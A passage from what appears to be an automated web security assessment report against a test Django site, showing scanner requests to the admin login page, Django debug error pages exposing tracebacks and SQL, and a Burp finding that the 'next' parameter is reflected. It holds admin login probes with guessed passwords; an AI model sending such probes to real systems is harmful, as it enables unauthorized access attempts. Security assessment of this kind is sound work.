 &#x27;/usr/local/lib/python3.9/site-packages&#x27;,
 &#x27;/usr/local/lib/python3.9/site-packages/setuptools/_vendor&#x27;]</pre></td>
    </tr>
    <tr>
      <th>Server time:</th>
      <td>Sun, 28 Jun 2026 06:06:03 +0000</td>
    </tr>
  </table>
</div>




<div id="traceback">
  <h2>Traceback <span class="commands"><a href="#" onclick="return switchPastebinFriendly(this);">
    Switch to copy-and-paste view</a></span>
  </h2>
  <div id="browserTraceback">
    <ul class="traceback">
      
        
        <li class="frame django">
          
            <code class="fname">/usr/local/lib/python3.9/site-packages/django/db/backends/utils.py</code>, line 84, in _execute
          

          
            <div class="context" id="c136281529939712">
              
                <ol start="77" class="pre-context" id="pre136281529939712">
                
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>    def _execute(self, sql, params, *ignored_wrapper_args):</pre></li>
                
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>        self.db.validate_no_broken_transaction()</pre></li>
                
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>        with self.db.wrap_database_errors:</pre></li>
                
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>            if params is None:</pre></li>
                
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>                # params default might be backend specific.</pre></li>
                
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>                return self.cursor.execute(sql)</pre></li>
                
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>            else:</pre></li>
                
                </ol>
              
              <ol start="84" class="context-line">
                <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>                return self.cursor.execute(sql, params)</pre> <span>…</span></li>
              </ol>
              
                <ol start='85' class="post-context" id="post136281529939712">
                  
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre></pre></li>
                  
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>    def _executemany(self, sql, param_list, *ignored_wrapper_args):</pre></li>
                  
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>        self.db.validate_no_broken_transaction()</pre></li>
                  
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>        with self.db.wrap_database_errors:</pre></li>
                  
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre>            return self.cursor.executemany(sql, param_list)</pre></li>
                  
                  <li onclick="toggle('pre136281529939712', 'post136281529939712')"><pre></pre></li>
                  
              </ol>
              
            </div>
          

          
            <div class="commands">
                
                    <a href="#" onclick="return varToggle(this, '136281529939712')"><span>&#x25b6;</span> Local vars</a>
                
            </div>
            <table class="vars" id="v136281529939712">
              <thead>
                <tr>
                  <th>Variable</th>
                  <th>Value</th>
                </tr>
              </thead>
              <tbody>
                
                  <tr>
                    <td>ignored_wrapper_args</td>
                    <td class="code"><pre>(False,
 {&#x27;connection&#x27;: &lt;django.db.backends.sqlite3.base.DatabaseWrapper object at 0x7bf28432e370&gt;,
  &#x27;cursor&#x27;: &lt;django.db.backends.utils.CursorDebugWrapper object at 0x7bf284326040&gt;})</pre></td>
                  </tr>
                
                  <tr>
                    <td>params</td>
                    <td class="code"><pre>(&#x27;admin&#x27;,)</pre></td>
                  </tr>
                
                  <tr>
                    <td>self</td>
                    <td class="code"><pre>&lt;django.db.backends.utils.CursorDebugWrapper object at 0x7bf284326040&gt;</pre></td>
                  </tr>
                
                  <tr>
                    <td>sql</td>
                    <td class="code"><pre>(&#x27;SELECT &quot;auth_user&quot;.&quot;id&quot;, &quot;auth_user&quot;.&quot;password&quot;, &quot;auth_user&quot;.&quot;last_login&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_superuser&quot;, &quot;auth_user&quot;.&quot;username&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;first_name&quot;, &quot;auth_user&quot;.&quot;last_name&quot;, &quot;auth_user&quot;.&quot;email&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_staff&quot;, &quot;auth_user&quot;.&quot;is_active&quot;, &quot;auth_user&quot;.&quot;date_joined&quot; &#x27;
 &#x27;FROM &quot;auth_user&quot; WHERE &quot;auth_user&quot;.&quot;username&quot; = %s LIMIT 21&#x27;)</pre></td>
                  </tr>
                
              </tbody>
            </table>
          
        </li>
      
        
        <li class="frame django">
          
            <code class="fname">/usr/local/lib/python3.9/site-packages/django/db/backends/sqlite3/base.py</code>, line 423, in execute
          

          
            <div class="context" id="c136281529941888">
              
                <ol start="416" class="pre-context" id="pre136281529941888">
                
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>    This fixes it -- but note that if you want to use a literal &quot;%s&quot; in a query,</pre></li>
                
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>    you&#x27;ll need to use &quot;%%s&quot;.</pre></li>
                
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>    &quot;&quot;&quot;</pre></li>
                
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>    def execute(self, query, params=None):</pre></li>
                
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>        if params is None:</pre></li>
                
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>            return Database.Cursor.execute(self, query)</pre></li>
                
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>        query = self.convert_query(query)</pre></li>
                
                </ol>
              
              <ol start="423" class="context-line">
                <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>        return Database.Cursor.execute(self, query, params)</pre> <span>…</span></li>
              </ol>
              
                <ol start='424' class="post-context" id="post136281529941888">
                  
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre></pre></li>
                  
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>    def executemany(self, query, param_list):</pre></li>
                  
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>        query = self.convert_query(query)</pre></li>
                  
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>        return Database.Cursor.executemany(self, query, param_list)</pre></li>
                  
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre></pre></li>
                  
                  <li onclick="toggle('pre136281529941888', 'post136281529941888')"><pre>    def convert_query(self, query):</pre></li>
                  
              </ol>
              
            </div>
          

          
            <div class="commands">
                
                    <a href="#" onclick="return varToggle(this, '136281529941888')"><span>&#x25b6;</span> Local vars</a>
                
            </div>
            <table class="vars" id="v136281529941888">
              <thead>
                <tr>
                  <th>Variable</th>
                  <th>Value</th>
                </tr>
              </thead>
              <tbody>
                
                  <tr>
                    <td>params</td>
                    <td class="code"><pre>(&#x27;admin&#x27;,)</pre></td>
                  </tr>
                
                  <tr>
                    <td>query</td>
                    <td class="code"><pre>(&#x27;SELECT &quot;auth_user&quot;.&quot;id&quot;, &quot;auth_user&quot;.&quot;password&quot;, &quot;auth_user&quot;.&quot;last_login&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_superuser&quot;, &quot;auth_user&quot;.&quot;username&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;first_name&quot;, &quot;auth_user&quot;.&quot;last_name&quot;, &quot;auth_user&quot;.&quot;email&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_staff&quot;, &quot;auth_user&quot;.&quot;is_active&quot;, &quot;auth_user&quot;.&quot;date_joined&quot; &#x27;
 &#x27;FROM &quot;auth_user&quot; WHERE &quot;auth_user&quot;.&quot;username&quot; = ? LIMIT 21&#x27;)</pre></td>
                  </tr>
                
                  <tr>
                    <td>self</td>
                    <td class="code"><pre>&lt;django.db.backends.sqlite3.base.SQLiteCursorWrapper object at 0x7bf284303700&gt;</pre></td>
                  </tr>
                
              </tbody>
            </table>
          
        </li>
      
        
          <li><h3>
          
            The above exception (no such table: auth_user) was the direct cause of the following exception:
          
        </h3></li>
        
        <li class="frame django">
          
            <code
```

- Evidence `ev-mqxdy83m-n` — `artifacts/s-0003/ev-mqxdy83m-n/`

Request:

```http
POST /admin/login/ HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken=UEwwsdMuQbIyhBxqF4syHLjreO2cF6nTSA8einmb9ZPchKfHlxAw8rSkmRjaas14&username=admin&password=wrongpass3&next=/admin/
```

Response (truncated):

```http
HTTP/1.1 500
content-length: 219475
content-type: text/html
date: Sun, 28 Jun 2026 06:06:06 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.25
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="robots" content="NONE,NOARCHIVE">
  <title>OperationalError
          at /admin/login/</title>
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background-color:#fff; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; }
    h2 { margin-bottom:.8em; }
    h3 { margin:1em 0 .5em 0; }
    h4 { margin:0 0 .5em 0; font-weight: normal; }
    code, pre { font-size: 100%; white-space: pre-wrap; }
    table { border:1px solid #ccc; border-collapse: collapse; width:100%; background:white; }
    tbody td, tbody th { vertical-align:top; padding:2px 3px; }
    thead th {
      padding:1px 6px 1px 3px; background:#fefefe; text-align:left;
      font-weight:normal; font-size:11px; border:1px solid #ddd;
    }
    tbody th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    table.vars { margin:5px 0 2px 40px; }
    table.vars td, table.req td { font-family:monospace; }
    table td.code { width:100%; }
    table td.code pre { overflow:hidden; }
    table.source th { color:#666; }
    table.source td { font-family:monospace; white-space:pre; border-bottom:1px solid #eee; }
    ul.traceback { list-style-type:none; color: #222; }
    ul.traceback li.frame { padding-bottom:1em; color:#4f4f4f; }
    ul.traceback li.user { background-color:#e0e0e0; color:#000 }
    div.context { padding:10px 0; overflow:hidden; }
    div.context ol { padding-left:30px; margin:0 10px; list-style-position: inside; }
    div.context ol li { font-family:monospace; white-space:pre; color:#777; cursor:pointer; padding-left: 2px; }
    div.context ol li pre { display:inline; }
    div.context ol.context-line li { color:#464646; background-color:#dfdfdf; padding: 3px 2px; }
    div.context ol.context-line li span { position:absolute; right:32px; }
    .user div.context ol.context-line li { background-color:#bbb; color:#000; }
    .user div.context ol li { color:#666; }
    div.commands { margin-left: 40px; }
    div.commands a { color:#555; text-decoration:none; }
    .user div.commands a { color: black; }
    #summary { background: #ffc; }
    #summary h2 { font-weight: normal; color: #666; }
    #explanation { background:#eee; }
    #template, #template-not-exist { background:#f6f6f6; }
    #template-not-exist ul { margin: 0 0 10px 20px; }
    #template-not-exist .postmortem-section { margin-bottom: 3px; }
    #unicode-hint { background:#eee; }
    #traceback { background:#eee; }
    #requestinfo { background:#f6f6f6; padding-left:120px; }
    #summary table { border:none; background:transparent; }
    #requestinfo h2, #requestinfo h3 { position:relative; margin-left:-100px; }
    #requestinfo h3 { margin-bottom:-1em; }
    .error { background: #ffc; }
    .specific { color:#cc3300; font-weight:bold; }
    h2 span.commands { font-size:.7em; font-weight:normal; }
    span.commands a:link {color:#5E5694;}
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
    .append-bottom { margin-bottom: 10px; }
    .fname { user-select: all; }
  </style>
  
  <script>
    function hideAll(elems) {
      for (var e = 0; e < elems.length; e++) {
        elems[e].style.display = 'none';
      }
    }
    window.onload = function() {
      hideAll(document.querySelectorAll('table.vars'));
      hideAll(document.querySelectorAll('ol.pre-context'));
      hideAll(document.querySelectorAll('ol.post-context'));
      hideAll(document.querySelectorAll('div.pastebin'));
    }
    function toggle() {
      for (var i = 0; i < arguments.length; i++) {
        var e = document.getElementById(arguments[i]);
        if (e) {
          e.style.display = e.style.display == 'none' ? 'block': 'none';
        }
      }
      return false;
    }
    function varToggle(link, id) {
      toggle('v' + id);
      var s = link.getElementsByTagName('span')[0];
      var uarr = String.fromCharCode(0x25b6);
      var darr = String.fromCharCode(0x25bc);
      s.textContent = s.textContent == uarr ? darr : uarr;
      return false;
    }
    function switchPastebinFriendly(link) {
      s1 = "Switch to copy-and-paste view";
      s2 = "Switch back to interactive view";
      link.textContent = link.textContent.trim() == s1 ? s2: s1;
      toggle('browserTraceback', 'pastebinTraceback');
      return false;
    }
  </script>
  
</head>
<body>
<div id="summary">
  <h1>OperationalError
       at /admin/login/</h1>
  <pre class="exception_value">no such table: auth_user</pre>
  <table class="meta">

    <tr>
      <th>Request Method:</th>
      <td>POST</td>
    </tr>
    <tr>
      <th>Request URL:</th>
      <td>http://target.local:32787/admin/login/</td>
    </tr>

    <tr>
      <th>Django Version:</th>
      <td>3.2</td>
    </tr>

    <tr>
      <th>Exception Type:</th>
      <td>OperationalError</td>
    </tr>


    <tr>
      <th>Exception Value:</th>
      <td><pre>no such table: auth_user</pre></td>
    </tr>


    <tr>
      <th>Exception Location:</th>
      <td><span class="fname">/usr/local/lib/python3.9/site-packages/django/db/backends/sqlite3/base.py</span>, line 423, in execute</td>
    </tr>

    <tr>
      <th>Python Executable:</th>
      <td>/usr/local/bin/python</td>
    </tr>
    <tr>
      <th>Python Version:</th>
      <td>3.9.25</td>
    </tr>
    <tr>
      <th>Python Path:</th>
      <td><pre>[&#x27;/app&#x27;,
 &#x27;/usr/local/lib/python39.zip&#x27;,
 &#x27;/usr/local/lib/python3.9&#x27;,
 &#x27;/usr/local/lib/python3.9/lib-dynload&#x27;,
 &#x27;/usr/local/lib/python3.9/site-packages&#x27;,
 &#x27;/usr/local/lib/python3.9/site-packages/setuptools/_vendor&#x27;]</pre></td>
    </tr>
    <tr>
      <th>Server time:</th>
      <td>Sun, 28 Jun 2026 06:06:06 +0000</td>
    </tr>
  </table>
</div>




<div id="traceback">
  <h2>Traceback <span class="commands"><a href="#" onclick="return switchPastebinFriendly(this);">
    Switch to copy-and-paste view</a></span>
  </h2>
  <div id="browserTraceback">
    <ul class="traceback">
      
        
        <li class="frame django">
          
            <code class="fname">/usr/local/lib/python3.9/site-packages/django/db/backends/utils.py</code>, line 84, in _execute
          

          
            <div class="context" id="c136281528292864">
              
                <ol start="77" class="pre-context" id="pre136281528292864">
                
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>    def _execute(self, sql, params, *ignored_wrapper_args):</pre></li>
                
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>        self.db.validate_no_broken_transaction()</pre></li>
                
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>        with self.db.wrap_database_errors:</pre></li>
                
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>            if params is None:</pre></li>
                
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>                # params default might be backend specific.</pre></li>
                
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>                return self.cursor.execute(sql)</pre></li>
                
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>            else:</pre></li>
                
                </ol>
              
              <ol start="84" class="context-line">
                <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>                return self.cursor.execute(sql, params)</pre> <span>…</span></li>
              </ol>
              
                <ol start='85' class="post-context" id="post136281528292864">
                  
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre></pre></li>
                  
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>    def _executemany(self, sql, param_list, *ignored_wrapper_args):</pre></li>
                  
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>        self.db.validate_no_broken_transaction()</pre></li>
                  
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>        with self.db.wrap_database_errors:</pre></li>
                  
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre>            return self.cursor.executemany(sql, param_list)</pre></li>
                  
                  <li onclick="toggle('pre136281528292864', 'post136281528292864')"><pre></pre></li>
                  
              </ol>
              
            </div>
          

          
            <div class="commands">
                
                    <a href="#" onclick="return varToggle(this, '136281528292864')"><span>&#x25b6;</span> Local vars</a>
                
            </div>
            <table class="vars" id="v136281528292864">
              <thead>
                <tr>
                  <th>Variable</th>
                  <th>Value</th>
                </tr>
              </thead>
              <tbody>
                
                  <tr>
                    <td>ignored_wrapper_args</td>
                    <td class="code"><pre>(False,
 {&#x27;connection&#x27;: &lt;django.db.backends.sqlite3.base.DatabaseWrapper object at 0x7bf284c35400&gt;,
  &#x27;cursor&#x27;: &lt;django.db.backends.utils.CursorDebugWrapper object at 0x7bf284326e20&gt;})</pre></td>
                  </tr>
                
                  <tr>
                    <td>params</td>
                    <td class="code"><pre>(&#x27;admin&#x27;,)</pre></td>
                  </tr>
                
                  <tr>
                    <td>self</td>
                    <td class="code"><pre>&lt;django.db.backends.utils.CursorDebugWrapper object at 0x7bf284326e20&gt;</pre></td>
                  </tr>
                
                  <tr>
                    <td>sql</td>
                    <td class="code"><pre>(&#x27;SELECT &quot;auth_user&quot;.&quot;id&quot;, &quot;auth_user&quot;.&quot;password&quot;, &quot;auth_user&quot;.&quot;last_login&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_superuser&quot;, &quot;auth_user&quot;.&quot;username&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;first_name&quot;, &quot;auth_user&quot;.&quot;last_name&quot;, &quot;auth_user&quot;.&quot;email&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_staff&quot;, &quot;auth_user&quot;.&quot;is_active&quot;, &quot;auth_user&quot;.&quot;date_joined&quot; &#x27;
 &#x27;FROM &quot;auth_user&quot; WHERE &quot;auth_user&quot;.&quot;username&quot; = %s LIMIT 21&#x27;)</pre></td>
                  </tr>
                
              </tbody>
            </table>
          
        </li>
      
        
        <li class="frame django">
          
            <code class="fname">/usr/local/lib/python3.9/site-packages/django/db/backends/sqlite3/base.py</code>, line 423, in execute
          

          
            <div class="context" id="c136281528292416">
              
                <ol start="416" class="pre-context" id="pre136281528292416">
                
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>    This fixes it -- but note that if you want to use a literal &quot;%s&quot; in a query,</pre></li>
                
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>    you&#x27;ll need to use &quot;%%s&quot;.</pre></li>
                
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>    &quot;&quot;&quot;</pre></li>
                
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>    def execute(self, query, params=None):</pre></li>
                
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>        if params is None:</pre></li>
                
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>            return Database.Cursor.execute(self, query)</pre></li>
                
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>        query = self.convert_query(query)</pre></li>
                
                </ol>
              
              <ol start="423" class="context-line">
                <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>        return Database.Cursor.execute(self, query, params)</pre> <span>…</span></li>
              </ol>
              
                <ol start='424' class="post-context" id="post136281528292416">
                  
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre></pre></li>
                  
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>    def executemany(self, query, param_list):</pre></li>
                  
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>        query = self.convert_query(query)</pre></li>
                  
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>        return Database.Cursor.executemany(self, query, param_list)</pre></li>
                  
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre></pre></li>
                  
                  <li onclick="toggle('pre136281528292416', 'post136281528292416')"><pre>    def convert_query(self, query):</pre></li>
                  
              </ol>
              
            </div>
          

          
            <div class="commands">
                
                    <a href="#" onclick="return varToggle(this, '136281528292416')"><span>&#x25b6;</span> Local vars</a>
                
            </div>
            <table class="vars" id="v136281528292416">
              <thead>
                <tr>
                  <th>Variable</th>
                  <th>Value</th>
                </tr>
              </thead>
              <tbody>
                
                  <tr>
                    <td>params</td>
                    <td class="code"><pre>(&#x27;admin&#x27;,)</pre></td>
                  </tr>
                
                  <tr>
                    <td>query</td>
                    <td class="code"><pre>(&#x27;SELECT &quot;auth_user&quot;.&quot;id&quot;, &quot;auth_user&quot;.&quot;password&quot;, &quot;auth_user&quot;.&quot;last_login&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_superuser&quot;, &quot;auth_user&quot;.&quot;username&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;first_name&quot;, &quot;auth_user&quot;.&quot;last_name&quot;, &quot;auth_user&quot;.&quot;email&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_staff&quot;, &quot;auth_user&quot;.&quot;is_active&quot;, &quot;auth_user&quot;.&quot;date_joined&quot; &#x27;
 &#x27;FROM &quot;auth_user&quot; WHERE &quot;auth_user&quot;.&quot;username&quot; = ? LIMIT 21&#x27;)</pre></td>
                  </tr>
                
                  <tr>
                    <td>self</td>
                    <td class="code"><pre>&lt;django.db.backends.sqlite3.base.SQLiteCursorWrapper object at 0x7bf284303d30&gt;</pre></td>
                  </tr>
                
              </tbody>
            </table>
          
        </li>
      
        
          <li><h3>
          
            The above exception (no such table: auth_user) was the direct cause of the following exception:
          
        </h3></li>
        
        <li class="frame django">
          
            <code
```

<a id="finding-4"></a>

### 4. [INFO] [burp] Input returned in response (reflected) (3 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The value of the <b>next</b> request parameter is copied into the application's response. (confidence: CERTAIN) [+2 more URL(s): http://target.local:32787/greet/, http://target.local:32787/admin/login] @ http://target.local:32787/admin/login/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqxe65no-r` — `artifacts/_/ev-mqxe65no-r/`

Request:

```http
GET /admin/login/ HTTP/1.1
Host: target.local:32787

GET /admin/login/?next=%2fadmin%2fhihtcsojf8 HTTP/1.1
Host: target.local:32787
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 200 OK
Date: Sun, 28 Jun 2026 06:08:27 GMT
Server: WSGIServer/0.2 CPython/3.9.25
Content-Type: text/html; charset=utf-8
Expires: Sun, 28 Jun 2026 06:08:27 GMT
Cache-Control: max-age=0, no-cache, no-store, must-revalidate, private
Vary: Cookie
X-Frame-Options: DENY
Content-Length: 2238
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie: <redacted>

<!DOCTYPE html>

<html lang="en-us" dir="ltr">
<head>
<title>Log in | Django site admin</title>
<link rel="stylesheet" type="text/css" href="/static/admin/css/base.css">

  <link rel="stylesheet" type="text/css" href="/static/admin/css/nav_sidebar.css">
  <script src="/static/admin/js/nav_sidebar.js" defer></script>

<link rel="stylesheet" type="text/css" href="/static/admin/css/login.css">





    <meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <link rel="stylesheet" type="text/css" href="/static/admin/css/responsive.css">
    

<meta name="robots" content="NONE,NOARCHIVE">
</head>


<body class=" login"
  data-admin-utc-offset="0">

<!-- Container -->
<div id="container">

    
    <!-- Header -->
    <div id="header">
        <div id="branding">
        
<h1 id="site-name"><a href="/admin/">Django administration</a></h1>

        </div>
        
        
    </div>
    <!-- END Header -->
    
    

    <div class="main shifted" id="main">
      
        
      
      <div class="content">
        
          
        
        <!-- Content -->
        <div id="content" class="colM">
          
          
          
          




<div id="content-main">



<form action="/admin/login/?next=%2fadmin%2fhihtcsojf8" method="post" id="login-form"><input type="hidden" name="csrfmiddlewaretoken" value="3MzSfi05TsX1N1Rpkf8i6mJ6JE4jCZgr1IbA5sAMcg4FNazG0Iggx2iZRHlh7lUC">
  <div class="form-row">
    
    <label class="required" for="id_username">Username:</label> <input type="text" name="username" autofocus autocapitalize="none" autocomplete="username" maxlength="150" required id="id_username">
  </div>
  <div class="form-row">
    
    <label class="required" for="id_password">Password:</label> <input type="password" name="password" autocomplete="current-password" required id="id_password">
    <input type="hidden" name="next" value="/admin/hihtcsojf8">
  </div>
  
  
  <div class="submit-row">
    <input type="submit" value="Log in">
  </div>
</form>

</div>

          
          <br class="clear">
        </div>
        <!-- END Content -->
        <div id="footer"></div>
      </div>
    </div>
</div>
<!-- END Container -->
</body>
</html>
```
